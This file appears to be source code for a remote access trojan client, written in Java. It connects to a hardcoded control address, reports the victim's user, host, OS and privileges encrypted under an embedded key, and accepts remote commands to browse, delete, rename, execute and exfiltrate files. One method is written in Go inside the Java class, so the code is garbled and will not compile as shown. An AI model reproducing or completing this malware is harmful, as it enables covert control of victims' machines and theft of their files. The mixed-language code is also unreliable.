import java.io.*;
import java.net.InetAddress;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.nio.file.attribute.BasicFileAttributes;
import java.security.MessageDigest;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.util.Base64;
import java.util.concurrent.TimeUnit;
import java.util.List;
import java.util.ArrayList;

public class EntryPoint {
    public static void main(String[] args) {
        System.out.println("Starting application...");
        new MainForm().start();
        System.out.println("App Started...");
    }
}

class MainForm {
    private Socket client;
    private Thread connectionThread;
    private final String encryptionKey = "xilAeTlwiiVXyBD0qxHJHpW8d8tbPqTw";
    private final int delay = 100;
    private final int clientPort = 4440;
    private final String clientIP = "127.0.0.1";
    private OutputStream outputStream;
    private InputStream inputStream;

    public void start() {
        connectionThread = new Thread(this::connect);
        connectionThread.start();
    }

	func (mf *MainForm) connect() {
		fmt.Println("Starting connect method...")
		for {
			fmt.Println("Connect: Attempting connection...")
			if mf.client == nil || mf.client.RemoteAddr() == nil {
				if mf.delay > 0 {
					fmt.Println("Connect: Delaying for", mf.delay, "milliseconds...")
					time.Sleep(mf.delay)
				}

				conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", mf.clientIP, mf.clientPort))
				if err != nil {
					fmt.Println("Exception in Connect:", err.Error())
					time.Sleep(4 * time.Second) // Retry after delay
					continue
				}

				mf.client = conn
				mf.outputStream = mf.client
				mf.inputStream = mf.client

				fmt.Println("Connect: Successfully connected to", mf.clientIP, ":", mf.clientPort)

				newConnectionMessage := fmt.Sprintf("NewConnection|Go|%s|%s|%s|%s|%s",
					os.Getenv("USER"),
					getHostname(),
					getOS(),
					getOSVersion(),
					mf.getPrivileges())

				fmt.Println("Connect: newConnectionMessage:", newConnectionMessage)

				encryptedMessage, _ := AESEncrypt(newConnectionMessage, mf.encryptionKey)
				fmt.Println("Connect: Encrypted message:", encryptedMessage)

				mf.send(encryptedMessage)
				fmt.Println("Connect: Message sent")

				go mf.read() // Start a new goroutine to handle reading from the socket
				break        // Exit loop on successful connection
			}
		}
	}


    private void read() {
        System.out.println("Starting read method...");
        String message = "";
        try {
            BufferedReader reader = new BufferedReader(new InputStreamReader(client.getInputStream()));
            while ((message = reader.readLine()) != null) {
                System.out.println("Read: Message received: " + message);
                message = AESDecrypt(message, encryptionKey);
                System.out.println("Read: Decrypted message: " + message);
                parse(message);
            }
        } catch (Exception e) {
            System.out.println("Exception in Read: " + e.getMessage());
            e.printStackTrace();
            try {
                TimeUnit.SECONDS.sleep(4);
            } catch (InterruptedException interruptedException) {
                interruptedException.printStackTrace();
            }
            connect();
        }
    }

    public void send(String message) {
        System.out.println("Starting send method...");
        try {
            BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(client.getOutputStream()));
            writer.write(message + "\n");
            writer.flush();
            System.out.println("Send: Message sent");
        } catch (IOException e) {
            System.out.println("Exception in Send: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private void parse(String msg) {
        System.out.println("Starting parse method...");
        System.out.println("Receiving message: " + msg);
        try {
            if (msg.startsWith("NewConnection")) {
                // Handle NewConnection case
            } else if (msg.startsWith("Disconnected")) {
                restartConnection();
            } else if (msg.startsWith("Restart")) {
                restartApplication();
            } else if (msg.startsWith("Close")) {
                System.exit(0);
            } else if (msg.startsWith("ListDrives")) {
                listDrives();
            } else if (msg.startsWith("ListFiles")) {
                showFiles(msg.replace("ListFiles", ""));
            } else if (msg.startsWith("mkdir")) {
                createDirectory(msg.replace("mkdir", ""));
            } else if (msg.startsWith("rmdir")) {
                deleteDirectory(msg.replace("rmdir", ""));
            } else if (msg.startsWith("rnfolder")) {
                renameDirectory(msg.replace("rnfolder", ""));
            } else if (msg.startsWith("mvdir")) {
                moveDirectory(msg.replace("mvdir", ""));
            } else if (msg.startsWith("mkfile")) {
                createNewFile(msg);
            } else if (msg.startsWith("rmfile")) {
                deleteFile(msg.replace("rmfile", ""));
            } else if (msg.startsWith("exfile")) {
                executeFile(msg.replace("exfile", ""));
            } else if (msg.startsWith("exdir")) {
                executeDirectory(msg.replace("exdir", ""));
            } else if (msg.startsWith("rnfile")) {
                renameFile(msg.replace("rnfile", ""));
            } else if (msg.startsWith("movefile")) {
                moveFile(msg.replace("movefile", ""));
            } else if (msg.startsWith("sharefile")) {
                shareFile(msg.replace("sharefile", ""));
            } else if (msg.startsWith("FileUpload")) {
                uploadFile(msg.replace("FileUpload", ""));
            }
        } catch (Exception e) {
            System.out.println("Exception in Parse: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private void restartConnection() {
        System.out.println("Restarting connection...");
        connectionThread = new Thread(this::connect);
        connectionThread.start();
    }

    private void restartApplication() {
        System.out.println("Restarting application...");
        // Implement restart logic
    }

    private String getPrivileges() {
        return "User";
    }

    private static final String ALGORITHM = "AES";
    private static final String TRANSFORMATION = "AES/ECB/PKCS5Padding";

    public static String AESEncrypt(String input, String key) throws Exception {
        SecretKeySpec secretKey = getKey(key);
        Cipher cipher = Cipher.getInstance(TRANSFORMATION);
        cipher.init(Cipher.ENCRYPT_MODE, secretKey);
        byte[] encryptedBytes = cipher.doFinal(input.getBytes(StandardCharsets.UTF_8));
        return Base64.getEncoder().encodeToString(encryptedBytes);
    }

    public static String AESDecrypt(String input, String key) throws Exception {
        SecretKeySpec secretKey = getKey(key);
        Cipher cipher = Cipher.getInstance(TRANSFORMATION);
        cipher.init(Cipher.DECRYPT_MODE, secretKey);
        byte[] decryptedBytes = cipher.doFinal(Base64.getDecoder().decode(input));
        return new String(decryptedBytes, StandardCharsets.UTF_8);
    }

    private static SecretKeySpec getKey(String key) throws Exception {
        MessageDigest sha = MessageDigest.getInstance("SHA-256");
        byte[] keyBytes = key.getBytes(StandardCharsets.UTF_8);
        keyBytes = sha.digest(keyBytes);
        return new SecretKeySpec(keyBytes, ALGORITHM);
    }

    // FileManager functions
    private void listDrives() {
        try {
            File[] drives = File.listRoots();
            StringBuilder drivesString = new StringBuilder();
            for (File drive : drives) {
                drivesString.append(drive.toString()).append("|");
            }
            send(AESEncrypt("Drives" + drivesString.toString(), encryptionKey));
        } catch (Exception e) {
            System.out.println("Error in listDrives: " + e.getMessage());
        }
    }

    public void showFiles(String path) {
        try {
            StringBuilder items = new StringBuilder(path + "|");

            // Get all directories
            try (DirectoryStream<Path> directoryStream = Files.newDirectoryStream(Paths.get(path))) {
                for (Path dir : directoryStream) {
                    if (Files.isDirectory(dir)) {
                        items.append(dir.getFileName().toString()).append("|")
                                .append(Files.getAttribute(dir, "creationTime").toString()).append("|")
                                .append(Files.getAttribute(dir, "lastAccessTime").toString()).append("|")
                                .append("").append("|1\n");
                    }
                }
            }

            // Get all files
            try (DirectoryStream<Path> fileStream = Files.newDirectoryStream(Paths.get(path))) {
                for (Path file : fileStream) {
                    if (!Files.isDirectory(file)) {
                        items.append(file.getFileName().toString()).append("|")
                                .append(Files.getAttribute(file, "creationTime").toString()).append("|")
                                .append(Files.getAttribute(file, "lastAccessTime").toString()).append("|")
                                .append(formatFileSize(Files.size(file))).append("|0\n");
                    }
                }
            }

            items = new StringBuilder(items.toString().trim());

            send(AESEncrypt("FileManagerFiles" + items, encryptionKey));
        } catch (Exception e) {
            System.out.println("Error in showFiles: " + e.getMessage());
        }
    }

    private String formatFileSize(long bytes) {
        double sizeInMB = (double) bytes / (1024 * 1024);
        return String.format("%.2f MB", sizeInMB);
    }

    private void createDirectory(String path) {
        try {
            Files.createDirectory(Paths.get(path));
        } catch (IOException e) {
            System.out.println("Error in createDirectory: " + e.getMessage());
        }
    }

    private void deleteFile(String path) {
        try {
            Files.deleteIfExists(Paths.get(path));
        } catch (IOException e) {
            System.out.println("Error in deleteFile: " + e.getMessage());
        }
    }

    private void executeFile(String path) {
        try {
            if (Files.exists(Paths.get(path))) {
                Runtime.getRuntime().exec("explorer.exe " + path);
            }
        } catch (IOException e) {
            System.out.println("Error in executeFile: " + e.getMessage());
        }
    }

    private void executeDirectory(String path) {
        try {
            if (Files.exists(Paths.get(path))) {
                Runtime.getRuntime().exec("explorer.exe " + path);
            }
        } catch (IOException e) {
            System.out.println("Error in executeDirectory: " + e.getMessage());
        }
    }

    private void shareFile(String filepath) {
        try {
            byte[] fileBytes = Files.readAllBytes(Paths.get(filepath));
            String base64String = Base64.getEncoder().encodeToString(fileBytes);
            String dataToEncrypt = "IncomingFile" + base64String;
            String encryptedData = AESEncrypt(dataToEncrypt, encryptionKey);
            send(encryptedData);
        } catch (IOException e) {
            System.out.println("Error in shareFile: " + e.getMessage());
        } catch (Exception e) {
            System.out.println("Error in shareFile encryption: " + e.getMessage());
        }
    }

    private void uploadFile(String msg) {
        // Implement file upload logic
    }
	
	//error checked
    private void renameDirectory(String path) {
        try {
            String[] parts = path.split("\\|");

            String oldPath = parts[0];
            String newPath = parts[1];
            Files.move(Paths.get(oldPath), Paths.get(newPath));
        } catch (Exception e) {
            // Log the exception
            e.printStackTrace();
        }
    }
	
    private void moveDirectory(String path) {
        try {
            String[] parts = path.split("\\|");

            String sourcePath = parts[0];
            String destinationPath = parts[1];
            Files.move(Paths.get(sourcePath), Paths.get(destinationPath));
        } catch (Exception e) {
            // Log the exception
            e.printStackTrace();
        }
    }

    private void createNewFile(String txt) {
        try {
            String contentWithoutMkfile = txt.replace("mkfile", "");
            String[] parts = contentWithoutMkfile.split("\\|");

            String targetPath = parts[0];
            String content = parts[1];

            Files.write(Paths.get(targetPath), content.getBytes(StandardCharsets.UTF_8));
        } catch (Exception e) {
            // Log the exception
            e.printStackTrace();
        }
    }

    private void renameFile(String path) {
        try {
            String[] parts = path.split("\\|");

            String oldPath = parts[0];
            String newPath = parts[1];
            Files.move(Paths.get(oldPath), Paths.get(newPath));
        } catch (Exception e) {
            // Log the exception
            e.printStackTrace();
        }
    }

    private void moveFile(String path) {
        try {
            String[] parts = path.split("\\|");

            String sourcePath = parts[0];
            String destinationPath = parts[1];
            Files.move(Paths.get(sourcePath), Paths.get(destinationPath));
        } catch (Exception e) {
            // Log the exception
            e.printStackTrace();
        }
    }

    private void deleteDirectory(String path) {
        try {
            Files.walkFileTree(Paths.get(path), new SimpleFileVisitor<Path>() {
                @Override
                public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) throws IOException {
                    Files.delete(file);
                    return FileVisitResult.CONTINUE;
                }

                @Override
                public FileVisitResult postVisitDirectory(Path dir, IOException exc) throws IOException {
                    Files.delete(dir);
                    return FileVisitResult.CONTINUE;
                }
            });
        } catch (Exception e) {
            // Log the exception
            e.printStackTrace();
        }
    }
	

}
